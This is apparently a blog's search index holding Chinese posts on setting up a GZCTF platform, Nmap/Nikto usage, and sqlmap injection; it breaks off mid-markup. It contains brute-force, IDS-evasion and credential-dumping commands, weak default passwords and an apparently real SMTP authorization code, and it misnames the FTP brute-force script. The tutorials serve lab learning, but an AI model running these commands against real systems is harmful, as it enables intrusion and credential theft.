<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>GZctf平台搭建</title>
      <link href="/undefined/e00fb546.html"/>
      <url>/undefined/e00fb546.html</url>
      
        <content type="html"><![CDATA[<h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><h1 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.下载安装docker-compose</span></span><br><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/1.27.4/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose</span><br><span class="line"><span class="comment"># 2.修改文件权限</span></span><br><span class="line">sudo <span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br><span class="line"><span class="comment"># 3.查看docker-compose版本</span></span><br><span class="line">docker-compose -v</span><br></pre></td></tr></table></figure><h1 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull gztime/gzctf:latest</span><br><span class="line">docker pull postgres:alpine</span><br></pre></td></tr></table></figure><ol><li>创建一个GZCTF文件夹</li><li>文件里创建下面这两个文件，<code>docker-compse.yml</code>和 <code>appsettings.json</code></li></ol><h1 id="配置docker-compose-yml"><a href="#配置docker-compose-yml" class="headerlink" title="配置docker-compose.yml"></a>配置docker-compose.yml</h1><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.0&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">gzctf:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">gztime/gzctf:latest</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;GZCTF_ADMIN_PASSWORD=Admin@1234&quot;</span> <span class="comment"># 管理员账户密码，账号为Admin</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;80:80&quot;</span> <span class="comment"># 对外端口号，前为外部端口。</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">default:</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./data/files:/app/uploads&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./appsettings.json:/app/appsettings.json:ro&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./logs:/app/log&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./data/keys:/root/.aspnet/DataProtection-Keys&quot;</span></span><br><span class="line">      <span class="comment"># - &quot;./k8sconfig.yaml:/app/k8sconfig.yaml:ro&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;/var/run/docker.sock:/var/run/docker.sock&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">postgres:alpine</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;POSTGRES_PASSWORD=Admin@1234&quot;</span> <span class="comment"># 数据库密码，务必要和appsettings.json中的配置一致</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">default:</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./data/db:/var/lib/postgresql/data&quot;</span></span><br></pre></td></tr></table></figure><h1 id="配置appsettings-json"><a href="#配置appsettings-json" class="headerlink" title="配置appsettings.json"></a>配置appsettings.json</h1><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;AllowedHosts&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ConnectionStrings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Database&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Host=db:5432;Database=gzctf;Username=postgres;Password=Admin@1234&quot;</span></span><br><span class="line">      <span class="comment">//&lt;String1&gt;换成数据库密码，随机密码且长度足够</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Logging&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;LogLevel&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Default&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Information&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Microsoft&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Warning&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Microsoft.Hosting.Lifetime&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Information&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">//邮箱配置</span></span><br><span class="line">  <span class="attr">&quot;EmailConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;SendMailAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Admin@qq.com&quot;</span><span class="punctuation">,</span>        <span class="comment">// 填入邮箱</span></span><br><span class="line">    <span class="attr">&quot;UserName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ctf_noreply&quot;</span><span class="punctuation">,</span>                 <span class="comment">// 发件人名称</span></span><br><span class="line">    <span class="attr">&quot;Password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UWPTINWMFPQVMPAH&quot;</span><span class="punctuation">,</span>            <span class="comment">// 邮箱密码，部分服务商需要填入授权码</span></span><br><span class="line">    <span class="attr">&quot;Smtp&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;smtp.163.com&quot;</span><span class="punctuation">,</span>                  <span class="comment">// 此处为163邮箱服务器，具体自定</span></span><br><span class="line">      <span class="attr">&quot;Port&quot;</span><span class="punctuation">:</span> <span class="number">465</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;XorKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Admin@1234&quot;</span><span class="punctuation">,</span>                      <span class="comment">// 自定XorKey</span></span><br><span class="line">  <span class="attr">&quot;ContainerProvider&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Docker&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;PublicEntry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.16.128&quot;</span><span class="punctuation">,</span>           <span class="comment">// 域名或IP配置，用于容器生成,域名不带http/https</span></span><br><span class="line">    <span class="attr">&quot;DockerConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;SwarmMode&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span>                                <span class="comment">// 本地配置Docker因此此处置空</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;RequestLogging&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;DisableRateLimit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;RegistryConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;UserName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ServerAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">//谷歌验证码配置</span></span><br><span class="line">  <span class="attr">&quot;GoogleRecaptcha&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;VerifyAPIAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.recaptcha.net/recaptcha/api/siteverify&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Sitekey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Secretkey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;RecaptchaThreshold&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.5&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>记得把注释全部删掉，需要修改的地方PublicEntry，根据自己服务器IP进行配置。其他自行修改</p><h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p>在GZCTF文件夹下面输入</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://oxzlwud9qtk.feishu.cn/space/api/box/stream/download/asynccode/?code=YjBhZTBhYjBmOTkzNTJmNjBlMmZiN2RjZWJhN2Y5M2FfZElYOTI0RzFhM3dvamVJTGpXZlZwSHU2TU10QTcyTjhfVG9rZW46UjhEY2IwcldVb2xtdUF4Ykd5RGMySnRrbldlXzE2OTY1NzM4ODQ6MTY5NjU3NzQ4NF9WNA"></p><h1 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h1><p>用户名：Admin</p><p>密码：Admin@1234</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Nmap及Nikto使用</title>
      <link href="/undefined/d1722e57.html"/>
      <url>/undefined/d1722e57.html</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><h2 id="扫描多个目标"><a href="#扫描多个目标" class="headerlink" title="扫描多个目标"></a>扫描多个目标</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 192.168.1.10 192.168.1.20</span><br><span class="line">nmap 192.168.1.10-192.168.20</span><br></pre></td></tr></table></figure><h2 id="详细扫描输出"><a href="#详细扫描输出" class="headerlink" title="详细扫描输出"></a>详细扫描输出</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -v 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="指定端口扫描"><a href="#指定端口扫描" class="headerlink" title="指定端口扫描"></a>指定端口扫描</h2><p>默认扫描1到10000端口</p><h3 id="单端口"><a href="#单端口" class="headerlink" title="单端口"></a>单端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 3389 192.168.1.10</span><br></pre></td></tr></table></figure><h3 id="端口范围"><a href="#端口范围" class="headerlink" title="端口范围"></a>端口范围</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 1-3000 192.168.1.10</span><br></pre></td></tr></table></figure><h3 id="端口组合扫描"><a href="#端口组合扫描" class="headerlink" title="端口组合扫描"></a>端口组合扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 3389,1-3000 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="扫描排除"><a href="#扫描排除" class="headerlink" title="扫描排除"></a>扫描排除</h2><p>排除就是在当扫描某一个网段的时候，不扫这个主机</p><h3 id="排除一个主机"><a href="#排除一个主机" class="headerlink" title="排除一个主机"></a>排除一个主机</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 192.168.1.0/24 -exclude 192.168.1.100    <span class="comment"># 排除 .100 的主机</span></span><br></pre></td></tr></table></figure><h3 id="排除文件中的主机"><a href="#排除文件中的主机" class="headerlink" title="排除文件中的主机"></a>排除文件中的主机</h3><p>文件ip.txt里写的是IP地址</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 192.168.1.0/24 -exclude ip.txt</span><br></pre></td></tr></table></figure><h2 id="Ping扫描"><a href="#Ping扫描" class="headerlink" title="Ping扫描"></a>Ping扫描</h2><p>主要用来探测主机存活，并不是探测端口开放</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.1.0/24</span><br><span class="line">-sn                     ping扫描,即主机发现</span><br></pre></td></tr></table></figure><h2 id="SYN半开放扫描"><a href="#SYN半开放扫描" class="headerlink" title="SYN半开放扫描"></a>SYN半开放扫描</h2><p>不需要通过完整握手，目标主机不会产生会话。更加隐蔽</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="TCP-UDP扫描"><a href="#TCP-UDP扫描" class="headerlink" title="TCP&#x2F;UDP扫描"></a>TCP&#x2F;UDP扫描</h2><h3 id="TCP扫描"><a href="#TCP扫描" class="headerlink" title="TCP扫描"></a>TCP扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sT 192.168.1.10</span><br></pre></td></tr></table></figure><h3 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sU 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="版本扫描"><a href="#版本扫描" class="headerlink" title="版本扫描"></a>版本扫描</h2><p>检测目标主机上端口运行的软件版本，不是用于扫描主机和端口，但是需要通过开放的端口去判断。非常的慢。最好在测试之前先知道哪些端口开放，再针对端口去扫描</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="操作系统扫描"><a href="#操作系统扫描" class="headerlink" title="操作系统扫描"></a>操作系统扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -O 192.168.1.10</span><br><span class="line">nmap -O --osscan-guess 192.168.1.10        <span class="comment"># 猜测匹配，猜测匹配最接近的操作系统</span></span><br></pre></td></tr></table></figure><h2 id="不用ping主机"><a href="#不用ping主机" class="headerlink" title="不用ping主机"></a>不用ping主机</h2><p>ping被拦截的情况下使用</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -O -PN 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="从文件中读取扫描"><a href="#从文件中读取扫描" class="headerlink" title="从文件中读取扫描"></a>从文件中读取扫描</h2><p>读取文件里面的ip地址扫描</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -iL ip.txt</span><br></pre></td></tr></table></figure><h2 id="路由跟踪扫描"><a href="#路由跟踪扫描" class="headerlink" title="路由跟踪扫描"></a>路由跟踪扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -traceroute 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>扫描的结果输出到屏幕，同时保存到1.txt</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 3389 -oG 1.txt 192.168.1.10</span><br></pre></td></tr></table></figure><h1 id="Nmap脚本"><a href="#Nmap脚本" class="headerlink" title="Nmap脚本"></a>Nmap脚本</h1><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --script=vuln 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --script=http-enum 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --script=dns-brute www.baidu.com</span><br></pre></td></tr></table></figure><h2 id="SSH爆破"><a href="#SSH爆破" class="headerlink" title="SSH爆破"></a>SSH爆破</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 22 --script=ssh-brute --script-args userdb=user.txt,passdb=passwd.txt 192.168.1.10</span><br><span class="line"><span class="comment"># --script-args 指定用户及密码字典</span></span><br></pre></td></tr></table></figure><h2 id="MySQL爆破"><a href="#MySQL爆破" class="headerlink" title="MySQL爆破"></a>MySQL爆破</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 3306 --script=mysql-brute.nse --script-args userdb=user.txt,passdb=passwd.txt 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="TELNET爆破"><a href="#TELNET爆破" class="headerlink" title="TELNET爆破"></a>TELNET爆破</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 23 --script=telnet-brute.nse --script-args userdb=user.txt,passdb=passwd.txt 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="SMB爆破"><a href="#SMB爆破" class="headerlink" title="SMB爆破"></a>SMB爆破</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 445 --script=smb-brute.nse --script-args userdb=user.txt,passdb=passwd.txt 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="FTP爆破"><a href="#FTP爆破" class="headerlink" title="FTP爆破"></a>FTP爆破</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 21 -sT --script=smb-brute.nse --script-args userdb=user.txt,passdb=passwd.txt 192.168.1.10</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><strong><a href="https://www.bmabk.com/index.php/post/133422.html" title="快点来学习吧">Nmap工具使用</a></strong></p><h1 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h1><h2 id="查看参数"><a href="#查看参数" class="headerlink" title="查看参数"></a>查看参数</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -h</span><br></pre></td></tr></table></figure><h2 id="查看插件"><a href="#查看插件" class="headerlink" title="查看插件"></a>查看插件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nikto --list-plugins</span><br></pre></td></tr></table></figure><h2 id="对目标进行扫描"><a href="#对目标进行扫描" class="headerlink" title="对目标进行扫描"></a>对目标进行扫描</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -host http://192.168.1.10 </span><br><span class="line"><span class="comment"># 可以是url的形式，也可以扫描文本里面的ip</span></span><br><span class="line">nikto -host ip.txt</span><br></pre></td></tr></table></figure><h2 id="指定端口进行扫描"><a href="#指定端口进行扫描" class="headerlink" title="指定端口进行扫描"></a>指定端口进行扫描</h2><p>默认80端口，检查ssl一些常见问题</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -host https://192.168.1.10 -ssl -port 443</span><br></pre></td></tr></table></figure><h2 id="结果输出"><a href="#结果输出" class="headerlink" title="结果输出"></a>结果输出</h2><p>支持：html、csv、json、nbe、sql、txt、xml</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -host http://192.168.1.10 -o result.html</span><br></pre></td></tr></table></figure><hr><h2 id="IDS躲避"><a href="#IDS躲避" class="headerlink" title="IDS躲避"></a>IDS躲避</h2><p><img src="/images/Nmap%E5%8F%8ANikto%E4%BD%BF%E7%94%A8/image1.png"></p><table><thead><tr><th>1</th><th>随机url编码</th></tr></thead><tbody><tr><td>2</td><td>只选择路径</td></tr><tr><td>3</td><td>提前结束url</td></tr><tr><td>4</td><td>优先考虑长随机字符串</td></tr><tr><td>5</td><td>参数欺骗</td></tr><tr><td>6</td><td>使用tab作为命令分隔符</td></tr><tr><td>7</td><td>变化的url</td></tr><tr><td>8</td><td>使用windows路径分隔符</td></tr></tbody></table><p>使用evasion后跟序号即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -host https://192.168.1.10 -ssl -port 443 -evasion 123456</span><br><span class="line"><span class="comment"># 使用IDS躲避规则的123456条来进行扫描</span></span><br></pre></td></tr></table></figure><h2 id="配合nmap使用"><a href="#配合nmap使用" class="headerlink" title="配合nmap使用"></a>配合nmap使用</h2><p>nmap扫描80端口的IP，并通过oG输出结果，通过“|”导入至nikto进行扫描</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 80 192.168.1.10 -oG - | nikto -host -</span><br></pre></td></tr></table></figure><h2 id="使用代理扫描"><a href="#使用代理扫描" class="headerlink" title="使用代理扫描"></a>使用代理扫描</h2><p>避免暴露IP可以进行代理扫描，参数-useproxy，需要配合代理工具</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -h 192.168.1.10 -userproxy 127.0.0.1:8080</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqlmap使用</title>
      <link href="/undefined/d85c58bf.html"/>
      <url>/undefined/d85c58bf.html</url>
      
        <content type="html"><![CDATA[<h1 id="Access-asp网站"><a href="#Access-asp网站" class="headerlink" title="Access+asp网站"></a>Access+asp网站</h1><h2 id="检测是否存在注入"><a href="#检测是否存在注入" class="headerlink" title="检测是否存在注入"></a>检测是否存在注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> -v 3</span><br></pre></td></tr></table></figure><blockquote><p>-v：详细登记（0-6，默认1）</p><p>0：只显示python错误以及重要信息<br>1：显示信息以及警告<br>2：显示debug消息<br>3：显示注入payload<br>4：显示http请求<br>5：显示http响应头<br>6：显示http响应内容</p></blockquote><p>输出back-end DBMS:Microsoft Access再出输入上面的命令，则会有注入语句提示</p><p><img src="/images/Sqlmap%E4%BD%BF%E7%94%A8/image1.png"></p><h2 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --tables</span><br></pre></td></tr></table></figure><p><img src="/images/Sqlmap%E4%BD%BF%E7%94%A8/image2.png"></p><h2 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --columns -T admin</span><br><span class="line"><span class="comment"># -T admin    指定表名</span></span><br></pre></td></tr></table></figure><p><img src="/images/Sqlmap%E4%BD%BF%E7%94%A8/image3.png"></p><h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --dump -C <span class="string">&quot;username,password&quot;</span> -T admin</span><br></pre></td></tr></table></figure><h1 id="Mysql-php网站"><a href="#Mysql-php网站" class="headerlink" title="Mysql+php网站"></a>Mysql+php网站</h1><h2 id="检测是否存在注入-1"><a href="#检测是否存在注入-1" class="headerlink" title="检测是否存在注入"></a>检测是否存在注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?r=content&amp;cid=3&quot;</span> -p cid -v 1</span><br><span class="line"><span class="comment"># -p    指定测试参数</span></span><br></pre></td></tr></table></figure><h2 id="获取当前用户和数据库名"><a href="#获取当前用户和数据库名" class="headerlink" title="获取当前用户和数据库名"></a>获取当前用户和数据库名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?r=content&amp;cid=3&quot;</span> -p cid --current-user --current-db</span><br></pre></td></tr></table></figure><h2 id="获取表名-1"><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?r=content&amp;cid=3&quot;</span> -p cid --tables -D <span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="comment"># -D &quot;admin&quot;    指定admin的数据库</span></span><br></pre></td></tr></table></figure><h2 id="获取列名-1"><a href="#获取列名-1" class="headerlink" title="获取列名"></a>获取列名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?r=content&amp;cid=3&quot;</span> -p cid -T <span class="string">&quot;mmanage&quot;</span> --columns -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h2 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?r=content&amp;cid=3&quot;</span> -p cid --dump -C <span class="string">&quot;user,password&quot;</span> -T <span class="string">&quot;mmanage&quot;</span> -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h1 id="Mysql-asp-net网站"><a href="#Mysql-asp-net网站" class="headerlink" title="Mysql+asp.net网站"></a>Mysql+asp.net网站</h1><h2 id="检测是否存在注入-2"><a href="#检测是否存在注入-2" class="headerlink" title="检测是否存在注入"></a>检测是否存在注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> -v 3</span><br></pre></td></tr></table></figure><h2 id="获取当前用户和数据库名-1"><a href="#获取当前用户和数据库名-1" class="headerlink" title="获取当前用户和数据库名"></a>获取当前用户和数据库名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --current-user --current-db</span><br></pre></td></tr></table></figure><h2 id="获取表名-2"><a href="#获取表名-2" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --tables -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h2 id="获取列名-2"><a href="#获取列名-2" class="headerlink" title="获取列名"></a>获取列名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --columns -T <span class="string">&quot;mmanage&quot;</span> -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h2 id="获取数据-2"><a href="#获取数据-2" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --dump -C <span class="string">&quot;username,password&quot;</span> -T <span class="string">&quot;mmanage&quot;</span> -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h1 id="Orcale-jsp网站"><a href="#Orcale-jsp网站" class="headerlink" title="Orcale+jsp网站"></a>Orcale+jsp网站</h1><h2 id="检测是否存在注入-3"><a href="#检测是否存在注入-3" class="headerlink" title="检测是否存在注入"></a>检测是否存在注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.jsp?id=1&quot;</span> --dbms orcale -v 3</span><br><span class="line"><span class="comment"># --dbms orcale    指定数据库类型</span></span><br></pre></td></tr></table></figure><h2 id="获取当前用户和数据库名-2"><a href="#获取当前用户和数据库名-2" class="headerlink" title="获取当前用户和数据库名"></a>获取当前用户和数据库名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.jsp?id=1&quot;</span> --dbms orcale --current-user --current-db</span><br></pre></td></tr></table></figure><h2 id="获取表名-3"><a href="#获取表名-3" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.jsp?id=1&quot;</span> --dbms orcale --tables -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h2 id="获取列名-3"><a href="#获取列名-3" class="headerlink" title="获取列名"></a>获取列名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span 